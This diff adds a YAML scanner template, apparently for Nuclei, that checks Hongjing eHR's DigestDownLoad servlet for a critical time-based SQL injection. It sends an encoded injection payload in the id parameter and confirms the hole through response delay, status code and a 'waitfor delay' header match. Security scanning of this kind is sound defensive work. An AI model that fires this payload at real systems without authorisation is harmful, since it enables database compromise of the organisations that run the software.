@@ -1,0 +1,32 @@
+id: hjsoft-hcm-DigestDownLoad-sqli
+
+info:
+  name: 宏景eHR DigestDownLoad - SQL注入漏洞
+  author: onewin
+  severity: critical
+  description: |
+    宏景eHR系统的DigestDownLoad接口存在SQL注入漏洞，攻击者可通过SOAP报文注入恶意SQL命令，导致数据库信息泄露或服务器控制。
+  reference: HJSOFT-2025-049246
+  tags: HJSoft-HCM
+
+http:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/servlet/DigestDownLoad?type=original&id=i8hoHAILh4YkvJtIAayRbgJzqZUPAATTP2HJBPAATTPfhxbhGm4jOsPAATTP2HJFPAATTPyM8PAATTP3HJDPAATTP"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
+      Accept-Encoding: "gzip, deflate"
+      Accept-Language: "zh-CN,zh;q=0.9"
+      Connection: "close"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 3 && duration < 8"  # 5秒延迟检测
+          - "status_code == 302"
+        condition: and
+      - type: word
+        part: header
+        words:
+          - 'waitfor delay'
